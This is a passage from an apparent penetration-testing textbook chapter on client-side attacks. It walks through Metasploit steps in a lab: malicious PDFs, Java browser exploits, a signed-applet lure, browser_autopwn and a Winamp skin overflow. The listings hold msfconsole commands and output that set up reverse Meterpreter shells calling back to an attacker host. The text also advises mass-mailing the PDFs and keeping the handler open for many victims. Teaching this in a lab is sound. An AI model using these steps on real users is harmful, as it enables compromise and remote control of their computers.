[*] exec: cp /root/.msf4/local/msf.pdf /var/www&#13;
&#13;
msf  exploit(adobe_utilprintf) &gt; <span class="strong"><strong>service apache2 start</strong></span>&#13;
[*] exec service apache2 start&#13;
&#13;
Starting web server: apache2.&#13;
&#13;
msf  exploit(adobe_utilprintf) &gt; <span class="strong"><strong>use multi/handler</strong></span>❶&#13;
msf  exploit(handler) &gt; <span class="strong"><strong>set payload windows/meterpreter/reverse_tcp</strong></span>&#13;
payload =&gt; windows/meterpreter/reverse_tcp&#13;
msf  exploit(handler) &gt; <span class="strong"><strong>set LHOST 192.168.20.9</strong></span>&#13;
lhost =&gt; 192.168.20.9&#13;
msf  exploit(handler) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
&#13;
[*] Started reverse handler on 192.168.20.9:4444&#13;
[*] Sending stage (752128 bytes) to 192.168.20.10&#13;
[*] Meterpreter session 2 opened (192.168.20.9:4444 -&gt; 192.168.20.10:1422) at&#13;
2015-05-05 20:26:15 -0400 ❷</pre></div></div><p><a class="indexterm" id="iddle1782"/><a class="indexterm" id="iddle1914"/>We copy the file to the Apache web server folder and start the server, if it is not already running. We’ll look at ways to lure users into opening malicious files later in this chapter, but for now we’ll just open the malicious PDF in Adobe Reader 8.1.2 on our Windows XP target. First, though, we need to set up a handler for the payload. We can use the <span class="emphasis"><em>multi/handler</em></span> ❶ module as we learned in <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>. (Be sure to kill the Aurora job if its handler is also listening on port 4444 to free up this port for <span class="emphasis"><em>multi/handler</em></span> use). When we open the malicious PDF, we again receive a session ❷.</p><p>Typically with an attack like this we won’t be targeting just one user. For best results we might use this malicious PDF as part of a social-engineering campaign, as discussed in the next chapter, by sending out a few to even hundreds of malicious PDFs in an attempt to entice users to open them. The <span class="emphasis"><em>multi/handler</em></span> listener we set up previously will close as soon as it sees the first connection, causing us to miss any other connections that come in from other users opening the PDF. It would be much better if we could leave our listener open to catch additional incoming connections.</p><p>As it turns out, an advanced option for the <span class="emphasis"><em>multi/handler</em></span> module solves this problem. As shown in <a class="xref" href="ch10.xhtml#keeping_the_handler_open_for_multiple_se" title="Example 10-12. Keeping the handler open for multiple sessions">Example 10-12</a>, the advanced option <code class="literal">ExitOnSession</code>, which is set to <code class="literal">true</code> by default, specifies whether the listener closes after it receives a session. If we set this option to <code class="literal">false</code>, the listener will stay open and allow us to catch multiple sessions with a single handler.</p><div class="example"><a id="keeping_the_handler_open_for_multiple_se"/><div class="example-title">Example 10-12. Keeping the handler open for multiple sessions</div><div class="example-contents"><pre class="programlisting">msf exploit(handler) &gt; <span class="strong"><strong>show advanced</strong></span>&#13;
Module advanced options:&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
   Name           : ExitOnSession&#13;
   Current Setting: true&#13;
   Description    : Return from the exploit after a session has been created&#13;
msf exploit(handler) &gt; <span class="strong"><strong>set ExitOnSession false</strong></span>❶&#13;
ExitOnSession =&gt; false&#13;
msf exploit(handler) &gt; <span class="strong"><strong>exploit -j</strong></span>❷&#13;
[*] Exploit running as background job.&#13;
[*] Started reverse handler on 192.168.20.9:4444&#13;
[*] Starting the payload handler...</pre></div></div><p><a class="indexterm" id="iddle1186"/><a class="indexterm" id="iddle1349"/><a class="indexterm" id="iddle1384"/><a class="indexterm" id="iddle1456"/>Set <code class="literal">ExitOnSession</code> to <code class="literal">false</code> in the usual way ❶. One side effect of this option is that if we, say, exploit and start the listener in the foreground, it will never close, so we will be stuck without an Msfconsole prompt indefinitely. For this reason, Metasploit will complain and note that you should use the <code class="literal">-j</code> option with <code class="literal">exploit</code> ❷ to run the handler as a job, in the background. This way you can continue to use Msfconsole while the handler catches any incoming shells in the background. To close the handler in the future, use <code class="literal">jobs</code>, followed by <code class="literal">kill</code> <span class="emphasis"><em><code class="literal">&lt;job number&gt;</code></em></span> as we did in the Aurora example.</p><p>This exploit and the Aurora browser example discussed earlier both rely on a missing security patch. Here we’ve exploited a security vulnerability to hijack control of the program and execute malicious code by tricking the user into letting us run malicious code. If the user will allow us to run code, a vulnerability in the PDF software becomes unnecessary.</p></div><div class="sect3" title="PDF Embedded Executable"><div class="titlepage"><div><div><h4 class="title" id="pdf_embedded_executable">PDF Embedded Executable</h4></div></div></div><p>Now for another PDF attack: This time we’ll embed a malicious executable inside a PDF. The corresponding Metasploit module is <span class="emphasis"><em>exploit/windows/fileformat/adobe_pdf_embedded_exe</em></span>, as shown in <a class="xref" href="ch10.xhtml#pdf_embedded_exe_module" title="Example 10-13. PDF embedded EXE module">Example 10-13</a>. Instead of exploiting the software as soon as the PDF is opened, the generated PDF will prompt the user for permission to run the embedded file. The success of our attack is contingent on the user allowing our executable to run.</p><div class="example"><a id="pdf_embedded_exe_module"/><div class="example-title">Example 10-13. PDF embedded EXE module</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use exploit/windows/fileformat/adobe_pdf_embedded_exe</strong></span>&#13;
msf  exploit(adobe_pdf_embedded_exe) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (exploit/windows/fileformat/adobe_pdf_embedded_exe):&#13;
&#13;
   Name            Current Setting                        Required  Description&#13;
   ----            ---------------                        --------  -----------&#13;
  ❶EXENAME                                                no        The Name of payload exe.&#13;
  ❷FILENAME        evil.pdf                               no        The output filename.&#13;
  ❸INFILENAME                                             yes       The Input PDF filename.&#13;
  ❹LAUNCH_MESSAGE  To view the encrypted content please   no        The message to display in&#13;
                     tick the "Do not show this message               the File: area&#13;
                     again" box and press Open.&#13;
--<span class="emphasis"><em>snip</em></span>--</pre></div></div><p>The module lets us specify a prebuilt executable file with the <code class="literal">EXENAME</code> ❶ option. If we don’t set this option, we can embed an .<span class="emphasis"><em>exe</em></span> file created from whatever payload we select. We can again change the filename to anything we like or leave the value as the default ❷. To use this module, we must use an input PDF for the <code class="literal">INFILENAME</code> ❸ option. The <code class="literal">LAUNCH_MESSAGE</code> ❹ option is the text that will be shown to the user as part of the prompt to run the executable.</p><p>Set the relevant options, as shown in <a class="xref" href="ch10.xhtml#setting_module_options_and_creating_the" title="Example 10-14. Setting module options and creating the malicious PDF">Example 10-14</a>.</p><div class="example"><a id="setting_module_options_and_creating_the"/><div class="example-title">Example 10-14. Setting module options and creating the malicious PDF</div><div class="example-contents"><pre class="programlisting">msf  exploit(adobe_pdf_embedded_exe) &gt; <span class="strong"><strong>set INFILENAME</strong></span> <span class="strong"><strong>/usr/share/set/readme/User_Manual.pdf</strong></span>❶&#13;
INFILENAME =&gt; /usr/share/set/readme/User_Manual.pdf&#13;
msf  exploit(adobe_pdf_embedded_exe) &gt; <span class="strong"><strong>set payload windows/meterpreter/reverse_tcp</strong></span>&#13;
payload =&gt; windows/meterpreter/reverse_tcp&#13;
msf  exploit(adobe_pdf_embedded_exe) &gt; <span class="strong"><strong>set LHOST 192.168.20.9</strong></span>&#13;
                                                                             LHOST =&gt; 192.168.20.9&#13;
msf  exploit(adobe_pdf_embedded_exe) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
&#13;
[*] Reading in '/usr/share/set/readme/User_Manual.pdf'...&#13;
[*] Parsing '/usr/share/set/readme/User_Manual.pdf'...&#13;
[*] Using 'windows/meterpreter/reverse_tcp' as payload...&#13;
[*] Parsing Successful. Creating 'evil.pdf' file...&#13;
[+] evil.pdf stored at /root/.msf4/local/evil.pdf❷</pre></div></div><p><a class="indexterm" id="iddle2424"/>We’ll use a PDF included with Kali Linux for our example: the Metasploit user guide at <span class="emphasis"><em>/user/share/set/readme/User_Manual.pdf</em></span> ❶. The generated PDF is again stored in the <span class="emphasis"><em>/root/msf4/local/</em></span> directory ❷. (Be sure to set up a handler for the payload with the <span class="emphasis"><em>multi/handler</em></span> module before opening the PDF on the Windows XP target. For a refresher, see <a class="xref" href="ch10.xhtml#serving_the_malicious_pdf_and_using_a_ha" title="Example 10-11. Serving the malicious PDF and using a handler">Example 10-11</a>.)</p><div class="note" title="Note"><h3 class="title"><a id="ch10note05"/>Note</h3><p>The previous exploit may have left Adobe Reader in a bad state, so you may need to restart Windows XP to get it to properly load the new PDF.</p></div><p>When the malicious PDF is opened, the user sees a warning like the one shown in <a class="xref" href="ch10.xhtml#pdf_embedded_executable_user_warning" title="Figure 10-1. PDF embedded executable user warning">Figure 10-1</a>. The user must click Open for the embedded executable to run. This attack depends on users being willing to click through this warning.</p><div class="figure"><a id="pdf_embedded_executable_user_warning"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00103"/><img alt="PDF embedded executable user warning" src="httpatomoreillycomsourcenostarchimages2030396.png.jpg"/></div></div><div class="figure-title">Figure 10-1. PDF embedded executable user warning</div></div><p><a class="indexterm" id="iddle1367"/><a class="indexterm" id="iddle1575"/><a class="indexterm" id="iddle1584"/><a class="indexterm" id="iddle2406"/>Once you click Open in the PDF warning, the payload will run, and you will receive a session.</p></div></div><div class="sect2" title="Java Exploits"><div class="titlepage"><div><div><h3 class="title" id="java_exploits">Java Exploits</h3></div></div></div><p>Java vulnerabilities are a prevalent client-side attack vector. In fact, some experts suggest that in light of the security issues that plague Java, users should uninstall or disable the software in their browsers.</p><p>One thing that makes Java attacks so powerful is that one exploit can gain access to multiple platforms. Windows, Mac, and even Linux systems running the Java Runtime Environment (JRE) in a browser can all be exploited by exactly the same exploit when that browser opens a malicious page. Here are some sample exploits.</p><div class="sect3" title="Java Vulnerability"><div class="titlepage"><div><div><h4 class="title" id="java_vulnerability">Java Vulnerability</h4></div></div></div><p>As exhibit number one, we’ll use the Metasploit module <span class="emphasis"><em>exploit/multi/browser/java_jre17_jmxbean</em></span>, as shown in <a class="xref" href="ch10.xhtml#setting_up_a_java_exploit" title="Example 10-15. Setting up a Java exploit">Example 10-15</a>. Use of this module is similar to that of the Internet Explorer Aurora exploit shown earlier in this chapter. Metasploit sets up a malicious server to exploit this cross-platform vulnerability on any browser that arrives at the page. Any browser running Java version 7 before update 11 is affected.</p><div class="example"><a id="setting_up_a_java_exploit"/><div class="example-title">Example 10-15. Setting up a Java exploit</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use exploit/multi/browser/java_jre17_jmxbean</strong></span>&#13;
msf  exploit(java_jre17_jmxbean) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (exploit/multi/browser/java_jre17_jmxbean):&#13;
&#13;
   Name        Current Setting  Required  Description&#13;
   ----        ---------------  --------  -----------&#13;
   SRVHOST     0.0.0.0          yes       The local host to listen on. This must be an address&#13;
                                            on the local machine or 0.0.0.0&#13;
   SRVPORT     8080             yes       The local port to listen on.&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
   URIPATH                      no        The URI to use for this exploit (default is random)&#13;
&#13;
&#13;
Exploit target:&#13;
&#13;
   Id  Name&#13;
   --  ----&#13;
   0   Generic (Java Payload)&#13;
&#13;
&#13;
msf  exploit(java_jre17_jmxbean) &gt; <span class="strong"><strong>set SRVHOST 192.168.20.9</strong></span>&#13;
SRVHOST =&gt; 10.0.1.9&#13;
msf  exploit(java_jre17_jmxbean) &gt; <span class="strong"><strong>set SRVPORT 80</strong></span>&#13;
SRVPORT =&gt; 80&#13;
msf  exploit(java_jre17_jmxbean) &gt; <span class="strong"><strong>set URIPATH javaexploit</strong></span>&#13;
URIPATH =&gt; javaexploit&#13;
msf  exploit(java_jre17_jmxbean) &gt; <span class="strong"><strong>show payloads</strong></span>❶&#13;
&#13;
Compatible Payloads&#13;
===================&#13;
&#13;
   Name                            Disclosure Date  Rank    Description&#13;
   ----                            ---------------  ----    -----------&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
   java/meterpreter/bind_tcp                        normal  Java Meterpreter, Java Bind TCP&#13;
                                                                  Stager&#13;
   java/meterpreter/reverse_http                    normal  Java Meterpreter, Java Reverse HTTP&#13;
                                                              Stager&#13;
   java/meterpreter/reverse_https                   normal  Java Meterpreter, Java Reverse&#13;
                                                              HTTPS Stager&#13;
   java/meterpreter/reverse_tcp                     normal  Java Meterpreter, Java Reverse TCP&#13;
                                                              Stager&#13;
   java/shell_reverse_tcp                           normal  Java Command Shell, Reverse TCP&#13;
                                                              Inline&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
msf  exploit(java_jre17_jmxbean) &gt; <span class="strong"><strong>set payload java/meterpreter/reverse_http</strong></span>❷&#13;
payload =&gt; java/meterpreter/reverse_http</pre></div></div><p><a class="indexterm" id="iddle1484"/><a class="indexterm" id="iddle1576"/>Set the options to match your environment. Set the <code class="literal">SRVHOST</code> option to the local IP address, and change the <code class="literal">SRVPORT</code>, if you would like. Set the <code class="literal">URIPATH</code> to something that will be easy to type in your target browser.</p><p>Notice that because this exploit is multi-platform and the code execution takes place entirely inside the JRE, our payload options are Java-based. The usual suspects are all here, from staged payloads, inline payloads, bind shells, reverse shells, Meterpreter, and so on, as shown in the list of payloads at ❶. We’ll use the payload <span class="emphasis"><em>java/meterpreter/reverse_http</em></span>, which uses legitimate HTTP traffic ❷. Its options are shown in <a class="xref" href="ch10.xhtml#exploiting_a_java_vulnerability_with_an" title="Example 10-16. Exploiting a Java vulnerability with an HTTP payload">Example 10-16</a>.</p><div class="example"><a id="exploiting_a_java_vulnerability_with_an"/><div class="example-title">Example 10-16. Exploiting a Java vulnerability with an HTTP payload</div><div class="example-contents"><pre class="programlisting">msf  exploit(java_jre17_jmxbean) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (exploit/multi/browser/java_jre17_jmxbean):&#13;
&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
&#13;
Payload options (java/meterpreter/reverse_http):&#13;
&#13;
   Name   Current Setting  Required  Description&#13;
   ----   ---------------  --------  -----------&#13;
   LHOST                   yes       The local listener hostname&#13;
   LPORT  8080             yes       The local listener port&#13;
&#13;
&#13;
Exploit target:&#13;
&#13;
   Id  Name&#13;
   --  ----&#13;
   0   Generic (Java Payload)&#13;
&#13;
&#13;
msf  exploit(java_jre17_jmxbean) &gt; <span class="strong"><strong>set LHOST 192.168.20.9</strong></span>&#13;
LHOST =&gt; 192.168.20.9&#13;
msf  exploit(java_jre17_jmxbean) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
[*] Exploit running as background job.&#13;
&#13;
[*] Started HTTP reverse handler on http://192.168.20.9:8080/&#13;
[*] Using URL: http://192.168.20.9:80/javaexploit&#13;
[*] Server started.&#13;
msf  exploit(java_jre17_jmxbean) &gt; [*] 192.168.20.12       java_jre17_jmxbean - handling request for /javaexploit&#13;
[*] 192.168.20.12        java_jre17_jmxbean - handling request for /javaexploit/&#13;
[*] 192.168.20.12        java_jre17_jmxbean - handling request for /javaexploit/hGPonLVc.jar&#13;
[*] 192.168.20.12        java_jre17_jmxbean - handling request for /javaexploit/hGPonLVc.jar&#13;
[*] 192.168.20.12:49188 Request received for /INITJM...&#13;
[*] Meterpreter session 1 opened (192.168.20.9:8080 -&gt; 192.168.20.12:49188) at 2015-05-05&#13;
19:15:19 -0400</pre></div></div><p>These options should look familiar. The default <code class="literal">LPORT</code> option is now 8080 instead of 4444. Notice that both <code class="literal">SRVPORT</code> and <code class="literal">LPORT</code> default to 8080, so we’ll need to change at least one of them.</p><p>After you’ve finished setting options, start the exploit server and browse to the malicious page from your Windows 7 target. Either Internet Explorer or Mozilla Firefox will fall victim to this attack as long as you have enabled the vulnerable Java browser plugin.</p><p>One of the great features of the HTTP and HTTPS Meterpreter payloads, aside from being legitimate HTTP and HTTPS traffic and thus by-passing even some traffic-inspecting filters, is their ability to reattach to a dropped session. (Network problems can cause sessions to spontaneously die—a big annoyance for pentesters.) We’ll examine other ways to gain persistent access in <a class="xref" href="ch13.xhtml" title="Chapter 13. Post Exploitation">Chapter 13</a>, but for now let’s detach our Meterpreter session, as shown in <a class="xref" href="ch10.xhtml#detaching_the_http_meterpreter_session" title="Example 10-17. Detaching the HTTP Meterpreter session">Example 10-17</a>.</p><div class="example"><a id="detaching_the_http_meterpreter_session"/><div class="example-title">Example 10-17. Detaching the HTTP Meterpreter session</div><div class="example-contents"><pre class="programlisting">msf  exploit(java_jre17_jmxbean) &gt; <span class="strong"><strong>sessions -i 1</strong></span>&#13;
[*] Starting interaction with 1...&#13;
&#13;
meterpreter &gt; <span class="strong"><strong>detach</strong></span>&#13;
&#13;
[*] 10.0.1.16 - Meterpreter session 1 closed.  Reason: User exit&#13;
msf  exploit(java_jre17_jmxbean) &gt;&#13;
[*] 192.168.20.12:49204 Request received for /WzZ7_vgHcXA6kWjDi4koK/...&#13;
[*] Incoming orphaned session WzZ7_vgHcXA6kWjDi4koK, reattaching...&#13;
[*] Meterpreter session 2 opened (192.168.20.9:8080 -&gt; 192.168.20.12:49204) at 2015-05-05 19:15:45 -0400 ❶</pre></div></div><p>As you can see, the handler for the HTTP Meterpreter payload is still running in the background. Wait a few seconds, and you should see a new session open without the user needing to revisit the attack page as shown at ❶. Unless the session has been formally exited, the payload will continue <a class="indexterm" id="iddle1362"/><a class="indexterm" id="iddle1572"/><a class="indexterm" id="iddle1658"/><a class="indexterm" id="iddle2163"/>to try to connect back to Metasploit. (You can specify how long the session tries to reconnect with the <code class="literal">SessionCommunicationTimeOut</code> parameter, an advanced option for the payload.)</p><p>But what if your pentest target is diligent in updating Java, and there are currently no zero-days for the software floating around the Internet?</p></div><div class="sect3" title="Signed Java Applet"><div class="titlepage"><div><div><h4 class="title" id="signed_java_applet">Signed Java Applet</h4></div></div></div><p>Much like the attack against PDF users discussed in <a class="xref" href="ch10.xhtml#pdf_embedded_executable" title="PDF Embedded Executable">PDF Embedded Executable</a>, we can bypass the need for an unpatched Java vulnerability by simply asking users to allow us to run malicious code. You’ve probably seen browser warnings like, “This site would like to run this thing in your browser, how would you like to proceed?” Sometimes even security-savvy users can be convinced to just say “Yes” and bypass this warning without further investigation if they can be convinced that what’s on the other side is useful.</p><p>The module we’ll use for this example is <span class="emphasis"><em>exploit/multi/browser/java_signed_applet</em></span>. As the name implies, this module will create a malicious Java applet, as shown in <a class="xref" href="ch10.xhtml#metasploit_signed_java_applet_module" title="Example 10-18. Metasploit signed Java applet module">Example 10-18</a>.</p><div class="example"><a id="metasploit_signed_java_applet_module"/><div class="example-title">Example 10-18. Metasploit signed Java applet module</div><div class="example-contents"><pre class="programlisting">msf  exploit(java_jre17_jmxbean) &gt; <span class="strong"><strong>use exploit/multi/browser/java_signed_applet</strong></span>&#13;
msf  exploit(java_signed_applet) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (exploit/multi/browser/java_signed_applet):&#13;
&#13;
   Name            Current Setting  Required  Description&#13;
   ----            ---------------  --------  -----------&#13;
   APPLETNAME      SiteLoader       yes       The main applet's class name.&#13;
  ❶CERTCN          SiteLoader       yes       The CN= value for the certificate. Cannot contain&#13;
                                                ',' or '/'&#13;
   SRVHOST         0.0.0.0          yes       The local host to listen on. This must be an&#13;
                                                address on the local machine or 0.0.0.0&#13;
   SRVPORT         8080             yes       The local port to listen on.&#13;
   SSL             false            no        Negotiate SSL for incoming connections&#13;
   SSLCert                          no        Path to a custom SSL certificate (default is&#13;
                                                randomly generated)&#13;
   SSLVersion      SSL3             no        Specify the version of SSL that should be used&#13;
                                                (accepted: SSL2, SSL3, TLS1)&#13;
  ❷SigningCert                      no        Path to a signing certificate in PEM or PKCS12&#13;
                                                (.pfx) format&#13;
   SigningKey                       no        Path to a signing key in PEM format&#13;
   SigningKeyPass                   no        Password for signing key (required if SigningCert&#13;
                                                is a .pfx)&#13;
   URIPATH                          no        The URI to use for this exploit (default is&#13;
                                                random)&#13;
&#13;
Exploit target:&#13;
&#13;
   Id  Name&#13;
   --  ----&#13;
  ❸1   Windows x86 (Native Payload)&#13;
&#13;
msf  exploit(java_signed_applet) &gt; <span class="strong"><strong>set APPLETNAME BulbSec</strong></span>&#13;
APPLETNAME =&gt; Bulb Security&#13;
msf  exploit(java_signed_applet) &gt; <span class="strong"><strong>set SRVHOST 192.168.20.9</strong></span>&#13;
SRVHOST =&gt; 192.168.20.9&#13;
msf  exploit(java_signed_applet) &gt; <span class="strong"><strong>set SRVPORT 80</strong></span>&#13;
SRVPORT =&gt; 80</pre></div></div><p><a class="indexterm" id="iddle1172"/><a class="indexterm" id="iddle1173"/><a class="indexterm" id="iddle2160"/>Older versions of Java will allow us to use the <code class="literal">CERTCN</code> option shown at ❶ to say that the applet is signed by any entity that we choose. Newer versions of Java, like the one installed on the Windows 7 target, will say that the signer is unknown unless we sign the applet with a trusted signing certificate, which we can specify at ❷. If this option is set, it will override the <code class="literal">CERTCN</code> option. If we have a trusted signing certificate or we’ve compromised a certificate from our target, we can make our applet look more legitimate, but we’ll leave our applet self-signed for this example.</p><p>As shown at ❸, the default target for this module is a Windows system. However, as shown in <a class="xref" href="ch10.xhtml#using_a_java_payload" title="Example 10-19. Using a Java payload">Example 10-19</a>, we can use payloads for other platforms running JRE.</p><div class="example"><a id="using_a_java_payload"/><div class="example-title">Example 10-19. Using a Java payload</div><div class="example-contents"><pre class="programlisting">msf  exploit(java_signed_applet) &gt; <span class="strong"><strong>show targets</strong></span>&#13;
&#13;
Exploit targets:&#13;
&#13;
   Id  Name&#13;
   --  ----&#13;
  ❶0   Generic (Java Payload)&#13;
   1   Windows x86 (Native Payload)&#13;
   2   Linux x86 (Native Payload)&#13;
   3   Mac OS X PPC (Native Payload)&#13;
   4   Mac OS X x86 (Native Payload)&#13;
&#13;
&#13;
msf  exploit(java_signed_applet) &gt; <span class="strong"><strong>set target 0</strong></span>&#13;
target =&gt; 0&#13;
&#13;
msf  exploit(java_signed_applet) &gt; <span class="strong"><strong>set payload java/meterpreter/reverse_tcp</strong></span>&#13;
payload =&gt; java/meterpreter/reverse_tcp&#13;
&#13;
msf  exploit(java_signed_applet) &gt; <span class="strong"><strong>set LHOST 192.168.20.9</strong></span>&#13;
LHOST =&gt; 192.168.20.9&#13;
msf  exploit(java_signed_applet) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
[*] Exploit running as background job.&#13;
&#13;
[*] Started reverse handler on 192.168.20.9:4444&#13;
[*] Using URL: http://192.168.20.9:80/Dgrz12PY&#13;
[*] Server started.</pre></div></div><p><a class="indexterm" id="iddle1130"/><a class="indexterm" id="iddle2015"/><a class="indexterm" id="iddle2135"/><a class="indexterm" id="iddle2185"/>As with other Java exploits, we can make this attack multi-platform. We can change the target to Linux or Mac OS, or use a Java payload ❶ that will target them all.</p><div class="note" title="Note"><h3 class="title"><a id="ch10note06"/>Note</h3><p>As with our PDF examples, the previous exploit has left Java in a bad state, and you may need to restart Windows 7 before attempting to run the applet.</p></div><p>Browse to the Metasploit server from your Windows 7 target, and you should be prompted to run the applet, as shown in <a class="xref" href="ch10.xhtml#java_applet_attack" title="Figure 10-2. Java applet attack">Figure 10-2</a>. The security warning informs you that if this applet is malicious, it will have access to the system and lets you know you should run the application only if the publisher is trusted. Because we didn’t use a signing certificate that is trusted by the browser certificate chain, the warning says in big letters that the publisher is unknown. This should stop anyone from running the malicious applet, right?</p><div class="figure"><a id="java_applet_attack"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00104"/><img alt="Java applet attack" src="httpatomoreillycomsourcenostarchimages2030398.png.jpg"/></div></div><div class="figure-title">Figure 10-2. Java applet attack</div></div><p>Despite the warnings, the Social-Engineer Toolkit (which we’ll explore in the next chapter) claims that this attack is one of the most successful of the many available, even though it doesn’t rely on any unpatched vulnerability in Java or the underlying operating system.</p></div></div><div class="sect2" title="browser_autopwn"><div class="titlepage"><div><div><h3 class="title" id="browserunderscoreautopwn">browser_autopwn</h3></div></div></div><p>The <span class="emphasis"><em>browser_autopwn</em></span> module is another client-side exploitation option available in Metasploit. Although it’s sometimes considered cheating, this module loads all the browser and browser add-on modules that it knows of (including Java, Flash, and so on) and waits for a browser to connect to the server. Once the browser connects, the server fingerprints the browser and serves up all the exploits it thinks are likely to succeed. An example is shown in <a class="xref" href="ch10.xhtml#starting_browserunderscoreautopwn" title="Example 10-20. Starting browser_autopwn">Example 10-20</a>.</p><div class="example"><a id="starting_browserunderscoreautopwn"/><div class="example-title">Example 10-20. Starting browser_autopwn</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use auxiliary/server/browser_autopwn</strong></span>&#13;
msf auxiliary(browser_autopwn) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (auxiliary/server/browser_autopwn):&#13;
&#13;
   Name        Current Setting  Required  Description&#13;
   ----        ---------------  --------  -----------&#13;
   LHOST                        yes       The IP address to use for reverse-connect payloads&#13;
   SRVHOST     0.0.0.0          yes       The local host to listen on. This must be an address&#13;
                                            on the local machine or 0.0.0.0&#13;
   SRVPORT     8080             yes       The local port to listen on.&#13;
   SSL         false            no        Negotiate SSL for incoming connections&#13;
   SSLCert                      no        Path to a custom SSL certificate (default is randomly&#13;
                                            generated)&#13;
   SSLVersion  SSL3             no        Specify the version of SSL that should be used&#13;
                                            (accepted: SSL2, SSL3, TLS1)&#13;
   URIPATH                      no        The URI to use for this exploit (default is random)&#13;
&#13;
msf auxiliary(browser_autopwn) &gt; <span class="strong"><strong>set LHOST 192.168.20.9</strong></span>&#13;
LHOST =&gt; 192.168.20.9&#13;
msf auxiliary(browser_autopwn) &gt; <span class="strong"><strong>set URIPATH autopwn</strong></span>&#13;
URIPATH =&gt; autopwn&#13;
msf auxiliary(browser_autopwn) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
[*] Auxiliary module execution completed&#13;
&#13;
[*] Setup&#13;
msf auxiliary(browser_autopwn) &gt;&#13;
[*] Obfuscating initial javascript 2015-03-25 12:55:22 -0400&#13;
[*] Done in 1.051220065 seconds&#13;
&#13;
[*] Starting exploit modules on host 192.168.20.9...&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
[*] --- Done, found 16 exploit modules&#13;
&#13;
[*] Using URL: http://0.0.0.0:8080/autopwn&#13;
[*] Local IP: http://192.168.20.9:8080/autopwn&#13;
[*] Server started.</pre></div></div><p>Our options for this module are the usual client-side attacks. As shown here, I’ve set the LHOST for my shells to call back to Kali’s IP address, and URIPATH to something easy to remember (<code class="literal">autopwn</code>). Note that we don’t need to set any payloads here; as the individual modules are loaded, Metasploit sets the payload options appropriately.</p><p><a class="indexterm" id="iddle1133"/><a class="indexterm" id="iddle2461"/>With the server started, browse to the malicious page from a web browser. I used Internet Explorer on my Windows 7 target as shown in <a class="xref" href="ch10.xhtml#autopwning_a_browser" title="Example 10-21. Autopwning a browser">Example 10-21</a>.</p><div class="example"><a id="autopwning_a_browser"/><div class="example-title">Example 10-21. Autopwning a browser</div><div class="example-contents"><pre class="programlisting">[*] 192.168.20.12    browser_autopwn - Handling '/autopwn'&#13;
[*] 192.168.20.12    browser_autopwn - Handling '/autopwn?sessid=TWljcm9zb2Z0IFdpbmRvd3M6NzpTUDE6ZW4tdXM6eDg2Ok1TSUU6OC4wOg%3d%3d'&#13;
[*] 192.168.20.12    browser_autopwn - JavaScript Report: Microsoft Windows:7:SP1:en-us:x86:&#13;
MSIE:8.0: ❶&#13;
[*] 192.168.20.12    browser_autopwn - Responding with 14 exploits ❷&#13;
[*] 192.168.20.12    java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation Vulnerability&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
msf auxiliary(browser_autopwn) &gt; <span class="strong"><strong>sessions -l</strong></span>&#13;
&#13;
Active sessions&#13;
===============&#13;
&#13;
  Id  Type                   Information                  Connection&#13;
  --  ----                   -----------                  ----------&#13;
  1   meterpreter java/java  Georgia Weidman @ BookWin7   192.168.20.9:7777 -&gt;&#13;
                                                            192.168.20.12:49195 (192.168.20.12)&#13;
  2   meterpreter java/java  Georgia Weidman @ BookWin7   192.168.20.9:7777 -&gt;&#13;
                                                            192.168.20.12:49202 (192.168.20.12)&#13;
  3   meterpreter java/java  Georgia Weidman @ BookWin7   192.168.20.9:7777 -&gt;&#13;
                                                            192.168.20.12:49206 (192.168.20.12)&#13;
  4   meterpreter java/java  Georgia Weidman @ BookWin7   192.168.20.9:7777 -&gt;&#13;
                                                            192.168.20.12:49209 (192.168.20.12)</pre></div></div><p>As you can see Metasploit notices my browser and attempts to detect its version and running software ❶. It then sends all the exploits it thinks might be effective ❷.</p><p>Once all is said and done, run <span class="strong"><strong><code class="literal">sessions -l</code></strong></span> to see how things turned out. In my case, I received four new sessions. Not bad for so little work. As you might expect though, all of those exploits overwhelmed the browser and it crashed. (Luckily, all of our sessions were automatically migrated.)</p><p>Though <span class="emphasis"><em>browser_autopwn</em></span> is not nearly as stealthy or elegant as performing reconnaissance and then choosing a particular exploit likely to work against a target, it can be a real help in a pinch, which is why it’s worth having in your pentesting arsenal.</p></div><div class="sect2" title="Winamp"><div class="titlepage"><div><div><h3 class="title" id="winamp">Winamp</h3></div></div></div><p>So far our client-side attacks have basically followed the same pattern. We generate a malicious file that exploits a vulnerability in the client software or prompts the user for permission to run malicious code. The user opens the file with the relevant program, and we get a session in Metasploit. Now for something a bit different.</p><p><a class="indexterm" id="iddle1386"/>In this example, we trick the user into replacing a configuration file for the Winamp music player program. When the user next opens the program, the evil configuration file will be processed regardless of which music file the user opens. The Metasploit module we’ll use is <span class="emphasis"><em>exploit/windows/fileformat/winamp_maki_bof</em></span>, which exploits a buffer overflow issue in Winamp version 5.55.</p><p>As you can see with <code class="literal">show options</code> in <a class="xref" href="ch10.xhtml#metasploit_winamp_exploit" title="Example 10-22. Metasploit Winamp exploit">Example 10-22</a>, this module has no options to set; all we need is a Windows payload. The module generates a malicious Maki file for use with Winamp skins. As with our PDF examples, it’s up to us to serve the file and set up a handler for the payload.</p><div class="example"><a id="metasploit_winamp_exploit"/><div class="example-title">Example 10-22. Metasploit 